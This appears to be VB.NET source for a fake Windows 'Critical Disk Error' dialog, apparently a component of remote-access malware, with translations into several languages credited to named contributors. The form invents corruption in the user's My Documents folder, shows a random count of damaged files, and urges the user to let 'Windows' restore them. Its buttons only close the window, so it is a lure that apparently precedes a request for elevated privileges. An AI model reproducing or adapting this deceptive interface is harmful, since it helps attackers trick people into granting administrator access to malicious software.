Imports System.Drawing
Imports System.Windows.Forms

Public Class ElevationFrm
    ' Inherits Form
    Dim rand As New Random

    Private Sub SetLanguage()
        Dim CountryCode As String = Globalization.RegionInfo.CurrentRegion.TwoLetterISORegionName
        'string CountryCode = "ES";
        Select Case CountryCode
            Case "PL"
                ' by navaro21
                Me.Text = "Krytyczny błąd dysku"
                lblHead.Text = "Plik lub lokalizacja została uszkodzona i jest niezdolna do odczytu."
                lblText.Text = "Zostało znalezionych wiele uszkodzonych plików w lokalizacji 'Moje Dokumenty'. Aby" & vbLf & "zapobiec poważnej utraty danych pozwól systemowi Windows odzyskać te pliki." & vbLf & vbLf & "Uszkodzona lokalizacja: " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Liczba uszkodzonych plików: " & rand.Next(4, 23)
                btnRestore.Text = "Odzyskaj pliki"
                btnRestoreAndCheck.Text = "Odzyskaj pliki i sprawdź dysk w poszukiwaniu błędów."
                linkError.Text = "Więcej szczegółów o tym błędzie"
                Exit Select
            Case "RU"
                ' by GameFire
                Me.Text = "Критическая ошибка диска"
                lblHead.Text = "Этот файл или каталог поврежден и нечитаемый"
                lblText.Text = "Несколько поврежденные файлы были найдены в каталоге 'Мои документы'. Для" & vbLf & "тогочтобы предотвратить потерю данных, пожалуйста позвольте Windows" & vbLf & "восстановить эти файлы." & vbLf & vbLf & "Поврежденный каталог: " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Количество поврежденных файлов: " & rand.Next(4, 23)
                btnRestore.Text = "Восстановление файлов"
                btnRestoreAndCheck.Text = "Восстановить файлы и проверять диск для ошибок"
                linkError.Text = "Подробнее об этой ошибке"
                Exit Select
            Case "FI"
                ' by Perfectionist & Qmz_
                Me.Text = "Kriittinen levyvirhe"
                lblHead.Text = "Tiedosto tai hakemisto on vioittunut ja lukukelvoton"
                lblText.Text = "Useita vioittuineita tiedostoja on löytynyt kansiosta 'Omat tiedostot'. Ehkäistäksesi" & vbLf & "vakavan tietojen menetyksen, salli Windowsin palauttaa nämä tiedostot." & vbLf & vbLf & "Vioittunut kansio: " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Korruptoituneiden tiedostojen määrä: " & rand.Next(4, 23)
                btnRestore.Text = "Palauta tiedostot"
                btnRestoreAndCheck.Text = "Palauta tiedostot ja aloita virheiden etsiminen"
                linkError.Text = "Lisätietoja virheestä"
                Exit Select
            Case "NL"
                ' by DeadLine
                Me.Text = "Kritieke schrijffout"
                lblHead.Text = "Het bestand of pad is corrupt of onleesbaar"
                lblText.Text = "Meerdere corrupte bestanden zijn gevonden in het pad 'Mijn Documenten'. Gelieve de" & vbLf & "bestanden door Windows te laten herstellen om dataverlies te voorkomen." & vbLf & vbLf & "Corrupt pad: " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Aantal corrupte bestanden: " & rand.Next(4, 23)
                btnRestore.Text = "Herstel bestanden"
                btnRestoreAndCheck.Text = "Herstel bestanden en controleer op schijffouten"
                linkError.Text = "Meer informatie over deze fout"
                Exit Select
            Case "FR"
                ' by Increment
                Me.Text = "Erreur Critique du Disque "
                lblHead.Text = "Le fichier ou le dossier spécifié est corrompu"
                lblText.Text = "De nombreux fichiers corrompus ont été trouvés dans le dossier 'Mes Documents'. Pour" & vbLf & "éviter toute perte de donnée, veuillez autoriser Windows à restaurer vos fichiers et" & vbLf & "données." & vbLf & vbLf & "Dossier corrompu : " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Nombre de fichier(s) corrompu(s) : " & rand.Next(4, 23)
                btnRestore.Text = "Restaurer les fichiers"
                btnRestoreAndCheck.Text = "Restaurer les fichiers et vérifier des érreurs sur le disque "
                linkError.Text = "En savoir plus à propos de cette erreurs"
                Exit Select
            Case "ES"
                ' by Xenocode
                Me.Text = "Error critico del disco duro"
                lblHead.Text = "El archivo o directorio está dañado y no se puede leer"
                lblText.Text = "Algunos archivos dañados múltiples han sido encontrados en el directorio 'Mis Documentos'." & vbLf & "Para prevenir la pérdida grave de datos, permita por favor de Windows para recuperar" & vbLf & "estos archivos." & vbLf & vbLf & "Directorio dañado : " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Archivos corrupots : " & rand.Next(4, 23)
                btnRestore.Text = "Recuperar archivos"
                btnRestoreAndCheck.Text = "Reparar archivos y comprobar si hay errores en el disco dur"
                linkError.Text = "Detalles de Errores"
                Exit Select
            Case "DE"
                Me.Text = "Kritischer Festplatten Fehler"
                lblHead.Text = "Die Datei oder das Verzeichnis ist beschädigt und nicht lesbar"
                lblText.Text = "Es wurden mehrere beschädigte Dateien in dem Verzeichnis 'Meine Dokumente' gefunden." & vbLf & "Um einen ernsthaften Datenverlust zu vermeiden, erlauben Sie bitte Windows, die Dateien" & vbLf & "wiederherzustellen." & vbLf & vbLf & "Beschädigtes Verzeichnis: " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Anzahl der beschädigten Dateien: " & rand.Next(4, 23)
                btnRestore.Text = "Dateien wiederherstellen"
                btnRestoreAndCheck.Text = "Dateien wiederherstellen und Festplatte auf Fehler überprüfen"
                linkError.Text = "Mehr Informationen zu diesem Fehler"
                Exit Select
            Case "AR"
                ' By : DragonzMaster
                Me.Text = "خطأ حرج بالقرص"
                lblHead.Text = "الملف او المجلد معطوب ولا يمكن قرائته"
                lblText.Text = "تم إيجاد عدة ملفات معطوبة بالمجلد 'مستنداتى'. لمنع" & vbLf & "خسائر كبيرة بالبيانات, من فضلك إسمح لنظام التشغيل بإستعادة هذه الملفات." & vbLf & vbLf & "المجلد المعطوب: " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "عدد الملفات المعطوبة: 4"
                btnRestore.Text = "إستعادة الملفات"
                btnRestoreAndCheck.Text = "إستعادة الملفات و فحص القرص من الأخطاء"
                linkError.Text = "لتفاصيل أكثر حول هذا الخطأ"
                Me.RightToLeft = True
                Exit Select
            Case Else
                ' this includes GB, US and all other
                Me.Text = "Critical Disk Error"
                lblHead.Text = "The file or directory is corrupted and unreadable"
                lblText.Text = "Multiple corrupted files have been found in the directory 'My Documents'. To prevent" & vbLf & "serious loss of data, please allow Windows to restore these files." & vbLf & vbLf & "Corrupted directory: " & Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & vbLf & "Corrupted files count: " & rand.Next(4, 23)
                btnRestore.Text = "Restore files"
                btnRestoreAndCheck.Text = "Restore files and check disk for errors"
                linkError.Text = "More details about this error"
                Exit Select
        End Select
    End Sub

    Private Sub Elevation_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        picError.Image = SystemIcons.[Error].ToBitmap()
        SetLanguage()
    End Sub

    Private Sub linkError_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles linkError.LinkClicked
        Process.Start("http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx")
    End Sub

    Private Sub ElevationFrm_Paint(sender As Object, e As PaintEventArgs) Handles Me.Paint
            e.Graphics.DrawLine(Pens.Gray, New Point(0, panelBot.Location.Y - 1), New Point(Me.Width, panelBot.Location.Y - 1))
        End Sub

    Private Sub btnRestore_Click_1(sender As Object, e As EventArgs) Handles btnRestore.Click
        Close()
    End Sub

    Private Sub btnRestoreAndCheck_Click_1(sender As Object, e As EventArgs) Handles btnRestoreAndCheck.Click
        Close()
    End Sub
End Class